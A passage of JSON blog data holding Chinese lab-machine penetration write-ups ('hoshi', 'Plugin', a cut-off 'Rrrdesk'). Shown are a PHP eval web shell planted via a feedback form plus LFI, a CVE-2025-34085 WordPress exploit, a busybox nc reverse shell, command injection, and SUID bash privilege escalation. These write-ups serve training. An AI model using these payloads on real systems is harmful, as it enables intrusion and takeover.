["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_hoshi", "postUrl": "post/nei-bu-_hoshi.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/204", "commentNum": 0, "wordCount": 4314, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u4f7f\u7528 `arp-scan` \u5728 `192.168.205.0/24` \u7f51\u6bb5\u4e2d\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.142 08:00:27:24:64:43       PCS Systemtechnik GmbH\n...\n```\n\n\u786e\u8ba4\u76ee\u6807\u4e3b\u673aIP\u5730\u5740\u4e3a `192.168.205.142`\u3002\n\n## 2. \u7aef\u53e3\u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.142\n...\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u5f00\u653e\u4e86 **22 (SSH)** \u548c **80 (HTTP)** \u4e24\u4e2a\u7aef\u53e3\u3002\u6211\u4eec\u5c06Web\u670d\u52a1\u4f5c\u4e3a\u4e3b\u8981\u7684\u653b\u51fb\u5165\u53e3\u3002\n\n## 3. Web\u76ee\u5f55\u4e0e\u6587\u4ef6\u53d1\u73b0\n\n\u8bbf\u95ee `http://192.168.205.142` \u662f\u4e00\u4e2a\u201c\u661f\u9645\u5546\u57ce\u201d\u7684\u5546\u54c1\u53cd\u9988\u9875\u9762\u3002\u4f7f\u7528 `dirsearch` \u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u53d1\u73b0\u591a\u4e2a\u5173\u952e\u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ dirsearch -u http://192.168.205.142\n...\n[09:26:07] 200 -    1KB - /admin.php\n[09:26:16] 200 -   23KB - /info.php\n[09:26:22] 200 -  109B  - /robots.txt\n[09:26:25] 301 -  320B  - /uploads  ->  http://192.168.205.142/uploads/\n...\n```\n\n\u4e3b\u8981\u53d1\u73b0\uff1a\n\n*   `/admin.php`: \u540e\u53f0\u767b\u5f55\u9875\u9762\u3002\n*   `/info.php`: \u4e00\u4e2a `phpinfo()` \u9875\u9762\uff0c\u6cc4\u9732\u4e86\u8be6\u7ec6\u7684PHP\u914d\u7f6e\u3002\n*   `/uploads/`: \u4e00\u4e2a\u5f00\u653e\u76ee\u5f55\u6d4f\u89c8\u7684\u4e0a\u4f20\u76ee\u5f55\u3002\n*   `/robots.txt`: \u5b58\u5728\u6709\u8da3\u7684\u4fe1\u606f\u3002\n\n## 4. \u4fe1\u606f\u6cc4\u9732\n\n\u67e5\u770b `robots.txt` \u6587\u4ef6\u5185\u5bb9\uff0c\u53d1\u73b0\u4e00\u6761\u91cd\u8981\u7ebf\u7d22\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.142/robots.txt\n\u672c\u7ad9\u7684 logo \u7075\u611f\u6765\u81ea https://maze-sec.com/special/1/\uff0c\u4f46\u6211\u4eec\u7ed9\u5b83\u6dfb\u4e86\u70b9\u7279\u522b\u7684\u2018\u5473\u9053\u2019\uff01\n```\n\n\u8be5\u7ebf\u7d22\u6697\u793a\u7f51\u7ad9\u7684logo\u56fe\u7247 `QQ.png` \u53ef\u80fd\u88ab\u4fee\u6539\u8fc7\uff0c\u542b\u6709\u9690\u85cf\u4fe1\u606f\u3002\n\n# \u4e8c\u3001Web\u6e17\u900f\u4e0e\u7acb\u8db3\u70b9\n\n## 1. \u540e\u53f0\u767b\u5f55\n\n\u8bbf\u95ee `/admin.php` \u662f\u4e00\u4e2a\u7ba1\u7406\u5458\u767b\u5f55\u9875\u9762\uff0c\u53ea\u9700\u8981\u8f93\u5165\u5bc6\u7801\u3002\u6839\u636e\u4e3b\u9875\u9875\u811a\u7684\u5ba2\u670d\u70ed\u7ebf `400-123-4567`\uff0c\u5c1d\u8bd5\u4ee5\u6b64\u4f5c\u4e3a\u5bc6\u7801\u8fdb\u884c\u767b\u5f55\uff0c\u6210\u529f\u8fdb\u5165\u540e\u53f0\u3002\n\n## 2. \u56fe\u50cf\u9690\u5199 (\u76f2\u6c34\u5370)\n\n\u6839\u636e `robots.txt` \u7684\u63d0\u793a\uff0c\u6211\u4eec\u6000\u7591logo\u56fe\u7247\u5b58\u5728\u9690\u5199\u3002\n\n1. \u5206\u522b\u4e0b\u8f7d\u76ee\u6807\u7f51\u7ad9\u7684logo\u548c\u539f\u59cblogo\u3002\n\n   ```bash\n   wget http://192.168.205.142/QQ.png -O target_logo.png\n   wget https://maze-sec.com/img/QQ.png -O original_logo.png\n   ```\n\n2. \u5e38\u89c4\u7684\u9690\u5199\u5206\u6790\u5de5\u5177\u5747\u672a\u53d1\u73b0\u5f02\u5e38\u3002\u8003\u8651\u5230\u201c\u5473\u9053\u201d\u8fd9\u79cd\u63cf\u8ff0\uff0c\u63a8\u6d4b\u53ef\u80fd\u662f\u76f2\u6c34\u5370\uff08Blind Watermark\uff09\u3002\n\n3. \u4f7f\u7528\u76f2\u6c34\u5370\u5de5\u5177\u8fdb\u884c\u89e3\u5bc6\uff0c\u6210\u529f\u63d0\u53d6\u51fa\u9690\u85cf\u7684\u6c34\u5370\u4fe1\u606f\u3002\n\n   ```bash\n   # \u514b\u9686\u5de5\u5177\n   git clone https://github.com/chishaxie/BlindWaterMark.git\n   cd BlindWaterMark\n   \n   # \u89e3\u7801\n   python bwmforpy3.py decode target_logo.png original_logo.png wm_extracted.png\n   ```\n\n4. \u67e5\u770b\u63d0\u53d6\u51fa\u7684\u6c34\u5370\u56fe\u7247 `wm_extracted.png`\uff0c\u5f97\u5230\u9690\u85cf\u7684\u76ee\u5f55\u8def\u5f84\uff1a`/hoshi/`\u3002\n\n![\u63d0\u53d6\u51fa\u7684\u6c34\u5370](http://7r1UMPHK.github.io/image/20250810220719846.webp)\n\n## 3. \u6587\u4ef6\u5305\u542b\u4e0eGetshell\n\n1. \u8bbf\u95ee\u65b0\u53d1\u73b0\u7684\u8def\u5f84 `http://192.168.205.142/hoshi/`\uff0c\u53d1\u73b0\u4e00\u4e2a\u6587\u4ef6 `gift.php`\u3002\u76f4\u63a5\u8bbf\u95ee\u8be5\u6587\u4ef6\u8fd4\u56de\u9519\u8bef\u201c\u975e\u6cd5\u6587\u4ef6\u540d\u201d\uff0c\u8fd9\u662f\u5178\u578b\u7684\u6587\u4ef6\u5305\u542b\uff08LFI\uff09\u6f0f\u6d1e\u7279\u5f81\u3002\n\n2. \u901a\u8fc7Fuzz\u5de5\u5177 `ffuf` \u7206\u7834\u53c2\u6570\uff0c\u786e\u5b9a\u7528\u4e8e\u6587\u4ef6\u5305\u542b\u7684\u53c2\u6570\u4e3a `file`\u3002\n\n3. \u5728 `admin.php` \u9875\u9762\u6e90\u7801\u4e2d\uff0c\u53d1\u73b0\u4e00\u884c\u9690\u85cf\u7684\u6ce8\u91ca\uff1a`<div style='display:none' id='static-tip'>[debug] \u9759\u6001\u9875\u9762\u5df2\u751f\u6210</div>`\u3002\n\n4. **\u653b\u51fb\u94fe\u68b3\u7406**\uff1a\n\n   *   \u5728\u4e3b\u9875 `/index.php` \u7684\u53cd\u9988\u8868\u5355\u4e2d\u63d0\u4ea4PHP Web Shell\u3002\n   *   \u767b\u5f55\u540e\u53f0 `/admin.php`\u3002\u8fd9\u4e2a\u767b\u5f55\u884c\u4e3a\u4f1a\u89e6\u53d1\u670d\u52a1\u5668\u5c06\u5728\u540e\u53f0\u751f\u6210\u4e00\u4e2a\u5305\u542b\u6240\u6709\u53cd\u9988\u5185\u5bb9\u7684\u9759\u6001\u6587\u4ef6 `admin.html`\u3002\uff08\u901a\u8fc7\u76ee\u5f55\u7206\u7834\u53d1\u73b0\uff09\n   *   \u5229\u7528 `gift.php` \u7684\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u53bb\u8bfb\u53d6\u8fd9\u4e2a\u65b0\u751f\u6210\u7684 `admin.html`\u3002\u7531\u4e8e\u8be5\u6587\u4ef6\u662f\u88abPHP\u5f15\u64ce\u5305\u542b\u7684\uff0c\u5176\u4e2d\u7684PHP\u4ee3\u7801\u5c06\u4f1a\u88ab\u6267\u884c\u3002\n\n5. **\u64cd\u4f5c\u6b65\u9aa4**:\n\n   * **\u6b65\u9aa4\u4e00\uff1a\u6ce8\u5165Payload**\u3002\u5728\u4e3b\u9875\u7684\u53cd\u9988\u8868\u5355\u4e2d\u7684'\u60a8\u7684\u6635\u79f0'\u8f93\u5165\u680f\u63d0\u4ea4\u4ee5\u4e0b\u5185\u5bb9\u3002\n\n     ```php\n     <?php eval($_POST['ant']); ?>\n     ```\n\n   * **\u6b65\u9aa4\u4e8c\uff1a\u89e6\u53d1\u751f\u6210**\u3002\u8bbf\u95ee `/admin.php` \u5e76\u4f7f\u7528\u5bc6\u7801 `400-123-4567` \u767b\u5f55\u3002\u6b64\u65f6\uff0c\u5305\u542b\u6211\u4eecPayload\u7684 `admin.html` \u6587\u4ef6\u5df2\u7ecf\u5728Web\u6839\u76ee\u5f55\u751f\u6210\u3002\n\n   * **\u6b65\u9aa4\u4e09\uff1a\u6784\u9020LFI URL**\u3002`http://192.168.205.142/hoshi/gift.php?file=admin.html`\n\n   * **\u6b65\u9aa4\u56db\uff1a\u8fde\u63a5Shell**\u3002\u4f7f\u7528\u8681\u5251\uff08AntSword\uff09\u8fde\u63a5\u4e0a\u8ff0URL\uff0c\u5bc6\u7801\u4e3a `ant`\uff0c\u6210\u529f\u83b7\u5f97 `www-data` \u7528\u6237\u7684Web Shell\u3002\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u6a2a\u5411\u79fb\u52a8 (www-data -> welcome)\n\n1. \u5728 `www-data` shell\u4e2d\uff0c\u4f7f\u7528 `linpeas.sh` \u7b49\u811a\u672c\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\u3002\u5728 `/var/backups/` \u76ee\u5f55\u4e0b\u53d1\u73b0\u4e00\u4e2a\u53ef\u8bfb\u7684\u654f\u611f\u6587\u4ef6 `shadow~`\u3002\n\n2. \u8bfb\u53d6\u8be5\u6587\u4ef6\uff0c\u83b7\u5f97 `root` \u548c `welcome` \u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u3002\n\n3. \u4f7f\u7528 `John the Ripper` \u548c `rockyou.txt` \u5b57\u5178\u5bf9\u54c8\u5e0c\u8fdb\u884c\u7834\u89e3\uff0c\u5f97\u5230 `welcome` \u7528\u6237\u7684\u5bc6\u7801\u4e3a `loveme2`\u3002\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ john --wordlist=rockyou.txt hash.txt\n   ...\n   loveme2          (welcome)     \n   ...\n   ```\n\n4. \u4f7f\u7528 `su` \u547d\u4ee4\u548c\u7834\u89e3\u51fa\u7684\u5bc6\u7801\u6210\u529f\u5207\u6362\u5230 `welcome` \u7528\u6237\u3002\n\n## 2. \u63d0\u6743\u81f3root (welcome -> root)\n\n1. \u5728 `welcome` \u7528\u6237\u4e0b\uff0c\u4f7f\u7528 `sudo -l` \u68c0\u67e5\u5176sudo\u6743\u9650\uff0c\u53d1\u73b0\u53ef\u4ee5\u65e0\u5bc6\u7801\u4ee5root\u6743\u9650\u6267\u884c\u4e00\u4e2aPython\u811a\u672c `/root/12345.py`\u3002\n\n   ```bash\n   welcome@hoshi:/tmp$ sudo -l\n   ...\n   User welcome may run the following commands on hoshi:\n       (ALL) NOPASSWD: /usr/bin/python3 /root/12345.py\n   ```\n\n2. \u6267\u884c\u8be5\u811a\u672c\uff0c\u5b83\u4f1a\u5728 `12345` \u7aef\u53e3\u4e0a\u5f00\u542f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u914d\u7f6eshell\u3002\n\n3. \u5728Kali\u653b\u51fb\u673a\u4e0a\uff0c\u4f7f\u7528 `ncat` \u8fde\u63a5\u8be5\u670d\u52a1\u3002\u901a\u8fc7 `help` \u547d\u4ee4\u53d1\u73b0 `exec_cmd` \u6307\u4ee4\u3002\u6d4b\u8bd5\u53d1\u73b0 `|;&<>` \u7b49\u5b57\u7b26\u88ab\u8fc7\u6ee4\uff0c\u4f46 `&&` \u53ef\u7528\u4e8e\u547d\u4ee4\u62fc\u63a5\u3002\n\n4. \u5229\u7528\u547d\u4ee4\u6ce8\u5165\uff0c\u4e3a `/bin/bash` \u6dfb\u52a0SUID\u6743\u9650\u3002\n\n   ```bash\n   conf> exec_cmd id'&&chmod +s /bin/bash&&'\n   uid=0(root) gid=0(root) groups=0(root)\n   ```\n\n5. \u56de\u5230\u9776\u673ashell\uff0c\u6267\u884c `bash -p`\uff0c\u6210\u529f\u83b7\u5f97root\u6743\u9650\u7684shell\u3002\n\n   ```bash\n   welcome@hoshi:/opt$ bash -p\n   bash-5.0# id\n   uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),1000(welcome)\n   ```\n\n# \u56db\u3001\u83b7\u53d6Flag\n\n\u73b0\u5728\u62e5\u6709\u4e86root\u6743\u9650\uff0c\u53ef\u4ee5\u8bfb\u53d6\u6240\u6709\u7684Flag\u3002\n\n```bash\nbash-5.0# cat /root/root.txt\nflag{root-5de923e57adefd6a1fd53a6705ad6486}\n\nbash-5.0# cat /home/welcome/user.txt\nflag{user-73b671a5f913d849d405784a428288dd}\n```\n\n\u6240\u6709Flag\u5747\u5df2\u627e\u5230\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1754839188, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-10", "dateLabelColor": "#0969da"}, "P205": {"htmlDir": "docs/post/nei-bu-_Plugin.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Plugin", "postUrl": "post/nei-bu-_Plugin.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/205", "commentNum": 0, "wordCount": 4584, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u53d1\u73b0**\n\n\u9996\u5148\uff0c\u4f7f\u7528 `arp-scan` \u5728 `192.168.205.0/24` \u7f51\u6bb5\u4e2d\u626b\u63cf\u5b58\u6d3b\u4e3b\u673a\uff0c\u786e\u5b9a\u76ee\u6807\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.131 08:00:27:5f:2c:34       PCS Systemtechnik GmbH\n...\n```\n\n\u547d\u4ee4\u8f93\u51fa\u786e\u8ba4\u4e86\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u4e3a `192.168.205.131`\u3002\n\n## **2. \u7aef\u53e3\u626b\u63cf**\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5bf9\u5916\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- 192.168.205.131\n...\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u8868\u660e\uff0c\u76ee\u6807\u4e3b\u673a\u5f00\u653e\u4e86 **22 (SSH)** \u548c **80 (HTTP)** \u7aef\u53e3\u3002Web\u670d\u52a1\u662f\u4e3b\u8981\u7684\u653b\u51fb\u5165\u53e3\u3002\n\n## **3. Web\u4fe1\u606f\u63a2\u6d4b**\n\n\u8bbf\u95ee `http://192.168.205.131` \u662f\u4e00\u4e2a Apache \u7684\u9ed8\u8ba4\u9875\u9762\u3002\u4f7f\u7528 `gobuster` \u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u53d1\u73b0\u4e86\u591a\u4e2aPHP\u9875\u9762\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ gobuster dir -u http://192.168.205.131 -w ... -x php,txt,html\n...\n/index.php            (Status: 302) [Size: 0] [--> home.php]\n/home.php             (Status: 200) [Size: 1954]\n/about.php            (Status: 200) [Size: 1286]\n/feedback.php         (Status: 200) [Size: 2189]\n...\n```\n\n\u5728\u6d4f\u89c8\u53d1\u73b0\u7684\u9875\u9762\u65f6\uff0c`feedback.php` \u7684\u63d0\u4ea4\u529f\u80fd\u5f39\u7a97\u6cc4\u9732\u4e86\u4e00\u4e2a\u5173\u952e\u4fe1\u606f\uff1a`\u53cd\u9988\u5df2\u63d0\u4ea4\uff01\u670d\u52a1\u7aef\u5904\u7406\u4f7f\u7528\u57df\u540d: plugin.dsz`\u3002\u6211\u4eec\u5c06\u6b64\u57df\u540d\u6dfb\u52a0\u5230\u672c\u5730 `/etc/hosts` \u6587\u4ef6\u4e2d\u3002\n\n\u914d\u7f6e\u597d `hosts` \u540e\uff0c\u4f7f\u7528 `nuclei` \u5bf9 `http://plugin.dsz` \u8fdb\u884c\u81ea\u52a8\u5316\u6f0f\u6d1e\u626b\u63cf\uff0c\u53d1\u73b0\u4e00\u4e2a\u4e25\u91cd\u6f0f\u6d1e\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nuclei -u http://plugin.dsz\n...\n[CVE-2025-34085] [http] [critical] http://plugin.dsz/wp-content/uploads/simple-file-list/aighbdh.php\n[wordpress-rce-simplefilelist] [http] [critical] http://plugin.dsz/wp-content/uploads/simple-file-list/egafhad.php\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u76f4\u6307 **WordPress** \u7684 **Simple File List** \u63d2\u4ef6\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08RCE\uff09\u6f0f\u6d1e (CVE-2025-34085)\u3002\n\n# **\u4e8c\u3001Web\u6e17\u900f\u4e0e\u7acb\u8db3\u70b9**\n\n## **1. RCE\u6f0f\u6d1e\u5229\u7528**\n\n\u6839\u636e `nuclei` \u7684\u626b\u63cf\u7ed3\u679c\uff0c\u6211\u4eec\u627e\u5230\u4e86\u9488\u5bf9 `CVE-2025-34085` \u7684\u516c\u5f00\u6f0f\u6d1e\u5229\u7528\u811a\u672c\u3002 \u8be5\u6f0f\u6d1e\u5141\u8bb8\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u4e0a\u4f20\u4e00\u4e2a\u4f2a\u88c5\u6210\u56fe\u7247\u7684\u6587\u4ef6\uff0c\u7136\u540e\u5c06\u5176\u91cd\u547d\u540d\u4e3a `.php` \u6587\u4ef6\uff0c\u4ece\u800c\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\n\n\u9996\u5148\uff0c\u4f7f\u7528\u6f0f\u6d1e\u5229\u7528\u811a\u672c\u6267\u884c `id` \u547d\u4ee4\uff0c\u9a8c\u8bc1\u6f0f\u6d1e\u662f\u5426\u5b58\u5728\u4e14\u53ef\u5229\u7528\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/CVE-2025-34085]\n\u2514\u2500$ python3 CVE-2025-34085.py -u http://plugin.dsz --cmd 'id'\n...\n[DEBUG] Command Output:\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n[+] http://plugin.dsz | http://plugin.dsz/wp-content/uploads/simple-file-list/cttlu7x9.php\n```\n\n\u547d\u4ee4\u6210\u529f\u8fd4\u56de `www-data` \u7528\u6237\u4fe1\u606f\uff0c\u786e\u8ba4RCE\u6f0f\u6d1e\u53ef\u4ee5\u5229\u7528\u3002\n\n## **2. Getshell**\n\n\u63a5\u4e0b\u6765\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u5f97\u4e00\u4e2a\u53cd\u5f39shell\u3002\u9996\u5148\u5728\u653b\u51fb\u673a\u4e0a\u8bbe\u7f6e `netcat` \u76d1\u542c `8888` \u7aef\u53e3\u3002\n\n\u7136\u540e\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u8ba9\u76ee\u6807\u4e3b\u673a\u53cd\u5f39\u4e00\u4e2a `/bin/bash` shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/CVE-2025-34085]\n\u2514\u2500$ python3 CVE-2025-34085.py -u http://plugin.dsz --cmd 'busybox nc 192.168.205.128 8888 -e /bin/bash'\n```\n\n\u653b\u51fb\u673a\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39shell\uff0c\u83b7\u5f97\u4e86 `www-data` \u7528\u6237\u7684\u8bbf\u95ee\u6743\u9650\u3002\n\n---\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. \u6a2a\u5411\u79fb\u52a8 (www-data -> yi)**\n\n\u5728 `www-data` shell\u4e2d\uff0c\u6211\u4eec\u9996\u5148\u5bfb\u627e\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u3002\u5728Web\u6839\u76ee\u5f55 `/var/www/plugin.dsz/` \u4e2d\uff0c\u627e\u5230\u4e86 `wp-config.php` \u6587\u4ef6\u3002\n\n```bash\nwww-data@Plugin:/var/www/plugin.dsz$ cat wp-config.php\n...\ndefine( 'DB_NAME', 'wordpress' );\ndefine( 'DB_USER', 'wordpressuser' );\ndefine( 'DB_PASSWORD', 'password' );\n...\n```\n\n\u5229\u7528\u6cc4\u9732\u7684\u6570\u636e\u5e93\u51ed\u636e\u8fde\u63a5\u5230\u672c\u5730MariaDB\u6570\u636e\u5e93\uff0c\u5e76\u67e5\u8be2 `wp_users` \u8868\u3002\n\n```sql\nMariaDB [wordpress]> select * from wp_users;\n+----+------------+------------------------------------+---------------+ ... +---------------------+--------------+\n| ID | user_login | user_pass                          | user_nicename | ... | user_activation_key | display_name |\n+----+------------+------------------------------------+---------------+ ... +---------------------+--------------+\n|  1 | root       | $wp$2y$10$...                       | root          | ... |                     | root         |\n|  2 | yi         | b00b6ce41fbb3854fbfddcb71b5aa15d     | yi            | ... | eWl5aXlp            | eWl5aXlp     |\n+----+------------+------------------------------------+---------------+ ... +---------------------+--------------+\n```\n\n\u6211\u4eec\u53d1\u73b0\u4e86\u4e24\u4e2a\u7528\u6237\uff1a`root` \u548c `yi`\u3002\u5728 `yi` \u7528\u6237\u7684\u6570\u636e\u884c\u4e2d\uff0c`user_activation_key` \u548c `display_name` \u5b57\u6bb5\u7684\u503c\u5747\u4e3a `eWl5aXlp`\u3002\u731c\u6d4b\u8fd9\u4e3a`yi`\u7528\u6237\u5bc6\u7801\u3002\n\n\u4f7f\u7528 `su yi` \u548c\u5bc6\u7801 `eWl5aXlp`\uff0c\u6210\u529f\u5207\u6362\u5230 `yi` \u7528\u6237\u3002\n\n## **2. \u63d0\u6743\u81f3root (yi -> root)**\n\n\u5207\u6362\u5230 `yi` \u7528\u6237\u540e\uff0c\u6267\u884c `sudo -l` \u6765\u68c0\u67e5\u5176 `sudo` \u6743\u9650\u3002\n\n```bash\nyi@Plugin:~$ sudo -l\n...\nUser yi may run the following commands on Plugin:\n    (ALL) NOPASSWD: /bin/bash /home/yi/yiyi.sh\n```\n\n\u7ed3\u679c\u663e\u793a\uff0c`yi` \u7528\u6237\u53ef\u4ee5\u65e0\u9700\u5bc6\u7801\u4ee5root\u6743\u9650\u6267\u884c `/home/yi/yiyi.sh` \u811a\u672c\u3002\u7531\u4e8e `yi` \u7528\u6237\u5bf9\u5176\u5bb6\u76ee\u5f55\u6709\u5199\u6743\u9650\uff0c\u6211\u4eec\u53ef\u4ee5\u8f7b\u6613\u5730\u66ff\u6362\u6389\u8fd9\u4e2a\u811a\u672c\u3002\n\n**\u63d0\u6743\u6b65\u9aa4**:\n\n1. \u5907\u4efd\u5e76\u66ff\u6362\u539f\u59cb\u811a\u672c\uff0c\u5199\u5165\u4e00\u4e2a\u53ef\u4ee5\u4e3a `/bin/bash` \u6dfb\u52a0SUID\u6743\u9650\u7684\u547d\u4ee4\u3002\n\n   ```bash\n   yi@Plugin:~$ mv /home/yi/yiyi.sh /home/yi/1\n   yi@Plugin:~$ echo 'chmod +s /bin/bash' > /home/yi/yiyi.sh\n   ```\n\n2. \u4ee5 `sudo` \u6743\u9650\u6267\u884c\u88ab\u7be1\u6539\u540e\u7684\u811a\u672c\u3002\n\n   ```bash\n   yi@Plugin:~$ sudo /bin/bash /home/yi/yiyi.sh\n   ```\n\n3. \u6267\u884c `bash -p`\u3002`-p` \u53c2\u6570\u4f7f\u5f97 `bash` \u5728\u542f\u52a8\u65f6\u4e0d\u4f1a\u653e\u5f03root\u6743\u9650\uff0c\u4ece\u800c\u83b7\u5f97\u4e00\u4e2a\u6709\u6548\u7684root shell\u3002\n\n   ```bash\n   yi@Plugin:~$ bash -p\n   bash-5.0# id\n   uid=1000(yi) gid=1000(yi) euid=0(root) egid=0(root) groups=0(root),1000(yi)\n   ```\n\n   `id` \u547d\u4ee4\u7684\u8f93\u51fa\u786e\u8ba4\u6211\u4eec\u5df2\u6210\u529f\u83b7\u5f97root\u6743\u9650\u3002\n\n---\n\n# **\u56db\u3001\u83b7\u53d6Flag**\n\n\u73b0\u5728\u6211\u4eec\u62e5\u6709\u4e86root\u6743\u9650\uff0c\u53ef\u4ee5\u8bfb\u53d6\u7cfb\u7edf\u4e0a\u7684\u6240\u6709\u654f\u611f\u6587\u4ef6\u3002\n\n```bash\nbash-5.0# cat /home/yi/user.txt\nflag{user-058e8f474511327e5aeed4efa793033a}\n\nbash-5.0# cat /root/root.txt\nflag{root-ab9d82b9ae7d7d7256a95efe3447ec78}\n```\n\n\u6240\u6709Flag\u5747\u5df2\u627e\u5230\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1754884124, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-11", "dateLabelColor": "#0969da"}, "P206": {"htmlDir": "docs/post/nei-bu-_Rrrdesk.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Rrrdesk", "postUrl": "post/nei-bu-_Rrrdesk.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/206", "commentNum": 0, "wordCount": 4325, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u53d1\u73b0**\n\n\u9996\u5148\uff0c\u4f7f\u7528 `arp-scan` \u5728 `192.168.205.0/24` \u7f51\u6bb5\u4e2d\u626b\u63cf\u5b58\u6d3b\u4e3b\u673a\uff0c\u786e\u5b9a\u76ee\u6807IP\u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.132 08:00:27:cf:26:10       PCS Systemtechnik GmbH\n...\n```\n\n\u547d\u4ee4\u8f93\u51fa\u786e\u8ba4\u4e86\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u4e3a `192.168.205.132`\u3002\n\n## **2. \u7aef\u53e3\u626b\u63cf**\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a `192.168.205.132` \u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5bf9\u5916\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.132\n...\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3389/tcp open  ms-wbt-server\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u8868\u660e\uff0c\u76ee\u6807\u4e3b\u673a\u5f00\u653e\u4e86 **22 (SSH)**\u3001**80 (HTTP)** \u548c **3389 (RDP)** \u7aef\u53e3\u3002\u6211\u4eec\u9996\u5148\u4eceWeb\u670d\u52a1\u5165\u624b\u3002\n\n## **3. Web\u4fe1\u606f\u63a2\u6d4b**\n\n\u8bbf\u95ee `http://192.168.205.132` \u662f\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u9875\u9762\u3002\u4f7f\u7528 `gobuster` 